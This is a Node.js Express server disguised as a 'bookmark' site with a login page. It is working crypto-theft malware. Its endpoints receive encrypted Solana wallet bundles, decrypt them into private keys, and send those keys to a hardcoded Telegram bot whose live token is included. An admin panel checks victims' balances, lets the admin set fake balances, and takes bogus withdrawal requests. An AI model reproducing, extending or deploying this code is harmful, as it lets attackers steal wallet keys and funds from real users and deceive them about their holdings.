const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const bs58 = require('bs58');
const { Connection, PublicKey } = require('@solana/web3.js');
const fetch = require('node-fetch');
const session = require('express-session'); // npm install express-session

const app = express();
const X7F9K2 = 5000;
const Q8M3N7 = path.join(__dirname, 'data.json');
const Z4H8L6 = "admin123";
const R2Y5P9 = crypto.randomBytes(32).toString('hex');
const W3K7M1 = new Set();

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7999609809:AAGDcZvnDwc08fg0VsgqmzzcixOEh4Ncv6o';
const TELEGRAM_CHAT_ID = '7348305177';  // Replace with your correct chat ID

app.use(bodyParser.json());
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// Session middleware for user auth (simple, in-memory; use Redis for prod)
app.use(session({
    secret: 'your-user-session-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set to true for HTTPS
}));

if (!fs.existsSync(Q8M3N7)) {
    fs.writeFileSync(Q8M3N7, JSON.stringify([]));
}

// Reads and parses the data.json file
function D5V8B3() {
    try {
        const data = fs.readFileSync(Q8M3N7, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading data file:', error);
        return [];
    }
}

// Writes data to the data.json file
function F6N2T9(data) {
    fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
}

// Establishes connection to Solana mainnet
const solanaConnection = new Connection('https://api.mainnet-beta.solana.com');

// Fetches the current price of Solana (SOL) in USD from CoinGecko
async function G7P4R8() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const data = await response.json();
        return data.solana.usd;
    } catch (error) {
        console.error('Error fetching SOL price (prob 429 from free APIs):', error);
        return 0;
    }
}

// Retrieves the balance of a Solana public key in SOL
async function H3X9M5(publicKeyString) {
    try {
        const publicKey = new PublicKey(publicKeyString);
        const balance = await solanaConnection.getBalance(publicKey);
        return balance / 1000000000;
    } catch (error) {
        console.error(`Failed to check balance for ${publicKeyString}:`, error.message);
        return 0;
    }
}

// Decrypts and processes an array of sBundles (encrypted wallet data)
function J8L4Q6(sBundlesString, bundleKey) {
    try {
        const sBundlesArray = JSON.parse(sBundlesString);
        const key = Buffer.from(bundleKey, "base64");
        const wallets = [];

        sBundlesArray.forEach((sBundle, idx) => {
            try {
                const [ivB64, ctB64] = sBundle.split(":");
                const iv = Buffer.from(ivB64, "base64");
                const ciphertext = Buffer.from(ctB64, "base64");

                const tag = ciphertext.slice(ciphertext.length - 16);
                const data = ciphertext.slice(0, ciphertext.length - 16);

                const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
                decipher.setAuthTag(tag);
                const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);

                const privKey = decrypted.slice(0, 32);
                const pubKey = decrypted.slice(32, 64);

                wallets.push({
                    walletIndex: idx + 1,
                    privateKey: bs58.default ? bs58.default.encode(decrypted) : bs58.encode(decrypted),
                    publicKey: bs58.default ? bs58.default.encode(pubKey) : bs58.encode(pubKey)
                });
            } catch (e) {
                console.error(`Error processing sBundle #${idx + 1}:`, e.message);
                wallets.push({
                    walletIndex: idx + 1,
                    error: e.message
                });
            }
        });

        return {
            count: sBundlesArray.length,
            wallets: wallets
        };
    } catch (e) {
        console.error('Error parsing sBundles:', e.message);
        return {
            count: 0,
            wallets: [],
            error: e.message
        };
    }
}

// Middleware to verify authentication token
function K9S2E7(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token || !W3K7M1.has(token)) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    next();
}

// Generates a random 32-byte token as a hexadecimal string
function A4C8N1() {
    return crypto.randomBytes(32).toString('hex');
}

// Sends a message to the Telegram chat
async function sendToTelegram(message, chatId = TELEGRAM_CHAT_ID) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Helper function to build formatted Telegram message
function buildTelegramMessage(newEntry, walletCount) {
    let message = `🔎 *Profile Information*\n`;
    message += `├ 👤 *User:* ${newEntry.user || 'Unknown'}\n`;
    message += `├ 🎖 *Level:* ${newEntry.level || 'N/A'}\n`;

    // Primary wallet under profile (first wallet)
    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets && newEntry.processedSBundles.wallets.length > 0) {
        const firstWallet = newEntry.processedSBundles.wallets[0];
        if (firstWallet.publicKey) {
            const shortened = firstWallet.publicKey.slice(0, 5) + '…' + firstWallet.publicKey.slice(-5);
            const link = `[${shortened}](https://solscan.io/account/${firstWallet.publicKey})`;
            message += `├ 💳 ${link}\n`;
        }
    }

    message += `├ 🪪 *ID:* ${newEntry.id || 'N/A'}\n\n`;

    // Connected Wallets
    message += `💳 *Connected Wallets (${walletCount})*\n`;
    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
        newEntry.processedSBundles.wallets.forEach((wallet, index) => {
            const idx = index + 1;
            if (wallet.publicKey || wallet.privateKey || wallet.error) {
                if (wallet.publicKey) {
                    const shortened = wallet.publicKey.slice(0, 5) + '…' + wallet.publicKey.slice(-5);
                    const link = `[${shortened}](https://solscan.io/account/${wallet.publicKey})`;
                    message += `├ ${idx}. 💳 ${link}\n`;
                }
                if (wallet.privateKey) {
                    message += `├ ${idx}. 🔑 *Key:* \`${wallet.privateKey}\`\n`;
                }
                if (wallet.error) {
                    message += `├ ${idx}. ❌ *Error:* \`${wallet.error}\`\n`;
                }
            }
        });
    }

    if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
        message += `\n⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\``;
    }

    return message;
}

// UPDATED: User login endpoint (handles POST /login)
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    // Demo: hardcoded user (replace with DB query in prod)
    if (email === 'user@example.com' && password === 'pass') {
        req.session.userId = email; // Store user session
        req.session.userEmail = email;
        res.json({ success: true, message: 'Logged in successfully' }); // JSON for AJAX
    } else {
        res.status(401).json({ success: false, error: 'Invalid email or password' });
    }
});

// UPDATED: Serve user login HTML at GET /login
app.get('/login', (req, res) => {
    // Inline the provided HTML (or save as public/user-login.html and serveFile)
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Bookmark Site</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0f23, #1a1a3e);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-container {
            background: rgba(17, 24, 39, 0.9);
            border: 1px solid #374151;
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }

        .login-title {
            text-align: center;
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #526FFF, #4752c4);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .login-subtitle {
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 32px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #ffffff;
            font-size: 14px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid #374151;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            transition: all 0.2s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: #526FFF;
            box-shadow: 0 0 0 3px rgba(82, 111, 255, 0.1);
        }

        .form-input.valid {
            border-color: #4ade80;
        }

        .form-input.invalid {
            border-color: #ef4444;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #526FFF, #4752c4);
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .login-btn:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(82, 111, 255, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .error-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #ef4444;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .back-link {
            text-align: center;
            margin-top: 24px;
        }

        .back-link a {
            color: rgba(255, 255, 255, 0.6);
            text-decoration: none;
            font-size: 14px;
            transition: color 0.2s ease;
        }

        .back-link a:hover {
            color: #526FFF;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1 class="login-title">Sign In</h1>
        <p class="login-subtitle">Access your bookmark dashboard</p>
        
        <div class="error-message" id="errorMessage">
            Please fix the errors below.
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email" class="form-label">Email</label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    class="form-input" 
                    placeholder="Enter your email..."
                    required
                >
                <div class="error-message" id="emailError">Please enter a valid email address.</div>
            </div>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="form-input" 
                    placeholder="Enter your password..."
                    required 
                    minlength="6"
                >
                <div class="error-message" id="passwordError">Password must be at least 6 characters.</div>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn" disabled>
                Sign In
            </button>
        </form>
        
        <div class="back-link">
            <a href="https://axiom-bookmark.onrender.com/signup.html">← Don't have an account? Signup</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const errorMessage = document.getElementById('errorMessage');
        const loginBtn = document.getElementById('loginBtn');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        function validateForm() {
            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
            const passwordValid = passwordInput.value.length >= 6;

            // Update input styles
            [emailInput, passwordInput].forEach(input => {
                input.classList.remove('valid', 'invalid');
            });
            if (emailInput.value) emailInput.classList.add(emailValid ? 'valid' : 'invalid');
            if (passwordInput.value) passwordInput.classList.add(passwordValid ? 'valid' : 'invalid');

            // Show/hide field errors
            document.getElementById('emailError').classList.toggle('show', !emailValid && emailInput.value);
            document.getElementById('passwordError').classList.toggle('show', !passwordValid);

            // Global error
            const hasErrors = !emailValid || !passwordValid;
            errorMessage.classList.toggle('show', hasErrors && (emailInput.value || passwordInput.value));
            loginBtn.disabled = hasErrors;
        }

        [emailInput, passwordInput].forEach(input => input.addEventListener('input', validateForm));

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (loginBtn.disabled) return;

            loginBtn.disabled = true;
            loginBtn.textContent = 'Signing In...';
            errorMessage.classList.remove('show');

            try {
                const formData = new FormData(loginForm);
                const response = await fetch('/login', {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                if (response.ok && result.success) {
                    window.location.href = '/dashboard';
                } else {
                    errorMessage.innerHTML = result.error || 'Invalid email or password.';
                    errorMessage.classList.add('show');
                }
            } catch (error) {
                errorMessage.textContent = 'Connection error. Please try again.';
                errorMessage.classList.add('show');
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = 'Sign In';
            }
        });
    </script>
</body>
</html>
    `);
});

// Serve dashboard at /dashboard (redirect from / if logged in)
app.get('/dashboard', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Redirect root to dashboard if logged in, else login
app.get('/', (req, res) => {
    if (req.session.userId) {
        res.redirect('/dashboard');
    } else {
        res.redirect('/login');
    }
});

// Admin login endpoint
app.post('/api/admin-login', (req, res) => {
    try {
        const { secretKey } = req.body;

        if (secretKey === Z4H8L6) {
            const token = A4C8N1();
            W3K7M1.add(token);

            setTimeout(() => {
                W3K7M1.delete(token);
            }, 24 * 60 * 60 * 1000);

            res.json({
                success: true,
                token: token,
                message: 'Authentication successful'
            });
        } else {
            res.status(401).json({
                success: false,
                message: 'Invalid secret key'
            });
        }
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Verify admin token endpoint
app.get('/api/verify-admin', (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token && W3K7M1.has(token)) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// Admin logout endpoint
app.post('/api/admin-logout', K9S2E7, (req, res) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (token) {
        W3K7M1.delete(token);
    }

    res.json({ success: true, message: 'Logged out successfully' });
});

// Store bookmark data endpoint with Telegram notification
app.post('/api/bookmark-data', async (req, res) => {
    try {
        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            chatId: req.body.chatId || null, // Store user chat ID if provided
            ...req.body
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }

        data.push(newEntry);
        F6N2T9(data);

        // Format and send Telegram notification
        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
        const message = buildTelegramMessage(newEntry, walletCount);

        // If too long, split into multiple messages
        if (message.length > 4096) {
            const chunks = [];
            let currentChunk = message.substring(0, 4096).trim();
            let remaining = message.substring(4096);

            chunks.push(currentChunk);

            while (remaining.length > 0) {
                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                remaining = remaining.substring(4096);
                chunks.push(currentChunk);
            }

            // Send each chunk
            for (let i = 0; i < chunks.length; i++) {
                await sendToTelegram(chunks[i]);
            }
        } else {
            await sendToTelegram(message);
        }

        res.json({ success: true, id: newEntry.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Retrieve bookmark data endpoint
app.get('/api/bookmark-data', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        res.json(data);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Delete bookmark data by ID endpoint
app.delete('/api/bookmark-data/:id', K9S2E7, (req, res) => {
    try {
        const data = D5V8B3();
        const filteredData = data.filter(item => item.id !== parseInt(req.params.id));
        F6N2T9(filteredData);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Update user balance endpoint (admin only)
app.post('/api/update-balance', K9S2E7, async (req, res) => {
    try {
        const { entryId, walletIndex, balance } = req.body;
        if (!entryId || typeof walletIndex !== 'number' || typeof balance !== 'number') {
            return res.status(400).json({ success: false, error: 'Missing or invalid parameters: entryId, walletIndex, balance required' });
        }

        const data = D5V8B3();
        const entryIndex = data.findIndex(item => item.id === entryId);
        if (entryIndex === -1) {
            return res.status(404).json({ success: false, error: 'Entry not found' });
        }

        const entry = data[entryIndex];
        if (!entry.processedSBundles || !entry.processedSBundles.wallets) {
            return res.status(400).json({ success: false, error: 'No wallets found in entry' });
        }

        const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === walletIndex);
        if (!wallet) {
            return res.status(404).json({ success: false, error: 'Wallet not found' });
        }

        // Add or update customBalance
        wallet.customBalance = balance;
        F6N2T9(data);

        res.json({ success: true, message: `Balance updated for wallet ${walletIndex} in entry ${entryId} to ${balance} SOL` });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Send message to user endpoint (admin only)
app.post('/api/send-user-message', K9S2E7, async (req, res) => {
    try {
        const { entryId, message } = req.body;
        if (!entryId || !message) {
            return res.status(400).json({ success: false, error: 'Missing parameters: entryId and message required' });
        }

        const data = D5V8B3();
        const entry = data.find(item => item.id === entryId);
        if (!entry) {
            return res.status(404).json({ success: false, error: 'Entry not found' });
        }

        const chatId = entry.chatId;
        if (!chatId) {
            return res.status(400).json({ success: false, error: 'No chat ID found for this user. Provide chatId when creating the entry.' });
        }

        const sent = await sendToTelegram(message, chatId);
        if (sent) {
            res.json({ success: true, message: 'Message sent to user successfully' });
        } else {
            res.status(500).json({ success: false, error: 'Failed to send message' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check balances of all wallets endpoint (now respects customBalance)
app.get('/api/check-balances', K9S2E7, async (req, res) => {
    try {
        const data = D5V8B3();
        const solPrice = await G7P4R8();

        let allAddresses = [];
        let totalSolBalance = 0;
        let addressBalances = [];

        for (const entry of data) {
            if (entry.processedSBundles && entry.processedSBundles.wallets) {
                for (const wallet of entry.processedSBundles.wallets) {
                    if (wallet.publicKey && !wallet.error) {
                        allAddresses.push({
                            entryId: entry.id,
                            walletIndex: wallet.walletIndex,
                            publicKey: wallet.publicKey
                        });
                    }
                }
            }
        }

        for (const addr of allAddresses) {
            const entry = data.find(e => e.id === addr.entryId);
            const wallet = entry.processedSBundles.wallets.find(w => w.walletIndex === addr.walletIndex);
            let balance = wallet.customBalance !== undefined ? wallet.customBalance : await H3X9M5(addr.publicKey);
            totalSolBalance += balance;

            addressBalances.push({
                entryId: addr.entryId,
                walletIndex: addr.walletIndex,
                publicKey: addr.publicKey,
                solBalance: balance,
                usdBalance: balance * solPrice,
                isCustom: wallet.customBalance !== undefined
            });
        }

        addressBalances.sort((a, b) => b.solBalance - a.solBalance);

        res.json({
            success: true,
            totalAddresses: allAddresses.length,
            totalSolBalance: totalSolBalance,
            totalUsdBalance: totalSolBalance * solPrice,
            solPrice: solPrice,
            addressBalances: addressBalances
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// User bookmark data (filtered by session user if available, else all)
app.get('/api/user-bookmark-data', (req, res) => {
    try {
        let data = D5V8B3();
        const userId = req.session.userId || req.query.userId; // Fallback to query param
        if (userId) {
            data = data.filter(item => item.user?.id === userId || item.user?.userId === userId);
        }
        // Add totalWalletBalance for each entry (sum of wallet balances)
        data = data.map(entry => {
            if (entry.processedSBundles?.wallets) {
                const total = entry.processedSBundles.wallets.reduce((sum, w) => sum + (w.customBalance !== undefined ? w.customBalance : 0), 0);
                entry.totalWalletBalance = total.toFixed(4);
            } else {
                entry.totalWalletBalance = '0.0000';
            }
            return entry;
        });
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// User balance (sum of all user's wallet balances)
app.get('/api/user-balance', async (req, res) => {
    try {
        const userId = req.session.userId || req.query.userId;
        if (!userId) {
            return res.status(401).json({ error: 'User not authenticated' });
        }
        const data = D5V8B3().filter(item => item.user?.id === userId || item.user?.userId === userId);
        let totalBalance = 0;
        for (const entry of data) {
            if (entry.processedSBundles?.wallets) {
                for (const wallet of entry.processedSBundles.wallets) {
                    if (wallet.publicKey && !wallet.error) {
                        const balance = wallet.customBalance !== undefined ? wallet.customBalance : await H3X9M5(wallet.publicKey);
                        totalBalance += balance;
                    }
                }
            }
        }
        res.json({ balance: totalBalance.toFixed(4) });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Withdrawal request
app.post('/api/withdraw', async (req, res) => {
    try {
        const { amount, note } = req.body;
        const userId = req.session.userId || req.query.userId;
        if (!userId) {
            return res.status(401).json({ success: false, error: 'User not authenticated' });
        }
        if (!amount || amount <= 0) {
            return res.status(400).json({ success: false, error: 'Invalid amount' });
        }

        // Log to file or DB (here, append to a withdrawals.json)
        const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
        let withdrawals = [];
        if (fs.existsSync(withdrawalsFile)) {
            withdrawals = JSON.parse(fs.readFileSync(withdrawalsFile, 'utf8'));
        }
        withdrawals.push({
            id: Date.now(),
            userId,
            amount,
            note,
            timestamp: new Date().toISOString(),
            status: 'pending'
        });
        fs.writeFileSync(withdrawalsFile, JSON.stringify(withdrawals, null, 2));

        // Notify admin via Telegram
        const message = `🚀 *Withdrawal Request*\nUser: ${userId}\nAmount: ${amount} SOL\nNote: ${note || 'N/A'}\nTime: ${new Date().toISOString()}`;
        await sendToTelegram(message);

        res.json({ success: true, message: 'Request submitted' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve bookmarkscript.js
app.get('/bookmarkscript.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'bookmarkscript.js'));
});

// Handle encoded data submission with Telegram notification
app.get('/data/:encodedData', async (req, res) => {
    try {
        const decodedData = JSON.parse(Buffer.from(req.params.encodedData, 'base64').toString());

        const data = D5V8B3();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            chatId: decodedData.chatId || null, // Store user chat ID if provided
            ...decodedData
        };

        if (newEntry.sBundles && newEntry.bundle) {
            newEntry.processedSBundles = J8L4Q6(newEntry.sBundles, newEntry.bundle);
        }

        data.push(newEntry);
        F6N2T9(data);

        // Format and send Telegram notification
        const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
        const message = buildTelegramMessage(newEntry, walletCount);

        // If too long, split into multiple messages
        if (message.length > 4096) {
            const chunks = [];
            let currentChunk = message.substring(0, 4096).trim();
            let remaining = message.substring(4096);

            chunks.push(currentChunk);

            while (remaining.length > 0) {
                currentChunk = `\n\n*Continued...* 📄\n\n${remaining.substring(0, 4096).trim()}`;
                remaining = remaining.substring(4096);
                chunks.push(currentChunk);
            }

            // Send each chunk
            for (let i = 0; i < chunks.length; i++) {
                await sendToTelegram(chunks[i]);
            }
        } else {
            await sendToTelegram(message);
        }

        res.redirect('/success');
    } catch (error) {
        res.status(400).send(`
<!DOCTYPE html>
<html>
<head>
    <title>Error</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .error { color: red; font-size: 24px; }
    </style>
</head>
<body>
    <div class="error">❌ Error: ${error.message}</div>
    <script>
        setTimeout(() => {
            window.close();
        }, 2000);
    </script>
</body>
</html>
        `);
    }
});

// Serve success page
app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Working on port ${PORT}.`);
});
